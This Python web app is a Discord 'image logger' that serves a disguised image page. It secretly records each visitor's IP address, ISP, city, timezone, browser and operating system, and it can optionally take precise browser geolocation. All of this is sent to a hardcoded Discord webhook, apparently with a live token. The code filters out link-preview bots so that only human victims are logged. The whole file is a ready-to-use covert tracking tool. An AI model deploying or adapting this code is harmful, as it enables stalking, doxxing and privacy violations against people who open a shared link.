from urllib import parse
import traceback, requests, base64, httpagentparser

config = {
    "webhook": "https://discord.com/api/webhooks/1507868979509858444/ijiGfDxt28i7dbuxPnJoDY5QbwpYZ7WVe1CIR_yM5AY23ryTWX6c-XJiNXv9CSv_3LjO",
    "image": "https://www.image2url.com/r2/default/images/1779574146634-8c086fb0-0025-4fdd-90f1-4f3d0398d526.png",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {"doMessage": False, "message": "Pwned.", "richMessage": True},
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {"redirect": False, "page": "https://your-link.here"},
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip and ip.startswith(("34", "35")):
        return "Discord"
    elif useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

def reportError(error):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [{"title": "Image Logger - Error", "color": config["color"],
                        "description": f"An error occurred!\n\n**Error:**\n```\n{error}\n```"}],
        }, timeout=10)
    except:
        pass

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip and ip.startswith(blacklistedIPs):
        return
    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            try:
                requests.post(config["webhook"], json={
                    "username": config["username"], "content": "",
                    "embeds": [{"title": "Image Logger - Link Sent", "color": config["color"],
                                "description": f"An **Image Logging** link was sent!\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`"}],
                }, timeout=10)
            except:
                pass
        return

    ping = "@everyone"
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
    except:
        info = {"proxy": False, "hosting": False, "isp": "Unknown", "as": "Unknown",
                "country": "Unknown", "regionName": "Unknown", "city": "Unknown",
                "lat": 0, "lon": 0, "timezone": "UTC/Unknown", "mobile": False}

    if info.get("proxy"):
        if config["vpnCheck"] == 2: return
        if config["vpnCheck"] == 1: ping = ""
    if info.get("hosting"):
        if config["antiBot"] == 4 and not info.get("proxy"): return
        if config["antiBot"] == 3: return
        if config["antiBot"] == 2 and not info.get("proxy"): ping = ""
        if config["antiBot"] == 1: ping = ""

    try:
        os_name, browser = httpagentparser.simple_detect(useragent or "")
    except:
        os_name, browser = "Unknown", "Unknown"

    tz_str = info.get("timezone", "UTC/Unknown")
    try:
        tz_parts = tz_str.split('/')
        tz_display = f"{tz_parts[1].replace('_', ' ')} ({tz_parts[0]})" if len(tz_parts) > 1 else tz_str
    except:
        tz_display = tz_str

    coords_str = f"{info.get('lat', '?')}, {info.get('lon', '?')}"
    maps_link = ""
    if coords:
        coords_str = coords.replace(',', ', ')
        maps_link = f'[Google Maps](https://www.google.com/maps/search/google+map++{coords})'

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": (
                f"**A User Opened the Original Image!**\n\n"
                f"**Endpoint:** `{endpoint}`\n\n"
                f"**IP Info:**\n"
                f"> **IP:** `{ip if ip else 'Unknown'}`\n"
                f"> **Provider:** `{info.get('isp', 'Unknown')}`\n"
                f"> **ASN:** `{info.get('as', 'Unknown')}`\n"
                f"> **Country:** `{info.get('country', 'Unknown')}`\n"
                f"> **Region:** `{info.get('regionName', 'Unknown')}`\n"
                f"> **City:** `{info.get('city', 'Unknown')}`\n"
                f"> **Coords:** `{coords_str}` ({'Approximate' if not coords else f'Precise, {maps_link}'})\n"
                f"> **Timezone:** `{tz_display}`\n"
                f"> **Mobile:** `{info.get('mobile', False)}`\n"
                f"> **VPN:** `{info.get('proxy', False)}`\n"
                f"> **Bot:** `{info.get('hosting', False)}`\n\n"
                f"**PC Info:**\n"
                f"> **OS:** `{os_name}`\n"
                f"> **Browser:** `{browser}`\n\n"
                f"**User Agent:**\n{useragent}"
            ),
        }],
    }
    if url:
        embed["embeds"][0].update({"thumbnail": {"url": url}})

    try:
        requests.post(config["webhook"], json=embed, timeout=10)
    except:
        pass

def app(environ, start_response):
    try:
        path = environ.get("PATH_INFO", "/")
        query_string = environ.get("QUERY_STRING", "")
        remote_addr = environ.get("REMOTE_ADDR", "")

        headers = {}
        for k, v in environ.items():
            if k.startswith("HTTP_"):
                headers[k[5:].replace("_", "-").lower()] = v

        ip = headers.get("x-forwarded-for", remote_addr)
        if ip and "," in ip:
            ip = ip.split(",")[0].strip()

        useragent = headers.get("user-agent", "")

        params = {}
        if query_string:
            params = dict(parse.parse_qsl(query_string))

        url = config["image"]
        if config.get("imageArgument"):
            b64param = params.get("url") or params.get("id")
            if b64param:
                try:
                    url = base64.b64decode(b64param.encode()).decode()
                except:
                    url = config["image"]

        bot = botCheck(ip, useragent)
        if bot:
            makeReport(ip, useragent, endpoint=path, url=url)
            if config.get("buggedImage"):
                pixel = base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==")
                start_response("200 OK", [
                    ("Content-Type", "image/png"),
                    ("Content-Length", str(len(pixel))),
                    ("Cache-Control", "no-cache"),
                    ("Access-Control-Allow-Origin", "*")
                ])
                return [pixel]
            else:
                start_response("302 Found", [("Location", url)])
                return [b""]

        data = f'''<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body style="margin:0;padding:0;overflow:hidden;">
<div style="width:100vw;height:100vh;background:url('{url}') center/contain no-repeat;"></div>
</body>
</html>'''

        if config.get("accurateLocation"):
            data = data.replace('</body>', '''
<script>
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function(pos) {
        var sep = window.location.href.includes("?") ? "&" : "?";
        var encoded = btoa(pos.coords.latitude + "," + pos.coords.longitude).replace(/=/g, "%3D");
        window.location.replace(window.location.href + sep + "g=" + encoded);
    });
}
</script>
</body>''')

        if config.get("redirect", {}).get("redirect"):
            data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'

        if config.get("message", {}).get("doMessage"):
            data = config["message"]["message"]

        location = None
        if params.get("g") and config.get("accurateLocation"):
            try:
                location = base64.b64decode(params["g"].encode()).decode()
            except:
                pass

        if location:
            makeReport(ip, useragent, location, path, url=url)
        else:
            makeReport(ip, useragent, endpoint=path, url=url)

        body = data.encode("utf-8")
        start_response("200 OK", [
            ("Content-Type", "text/html; charset=utf-8"),
            ("Content-Length", str(len(body))),
            ("Cache-Control", "no-cache")
        ])
        return [body]

    except Exception as e:
        reportError(traceback.format_exc())
        start_response("500 Internal Server Error", [("Content-Type", "text/plain")])
        return [b"Internal Server Error"]
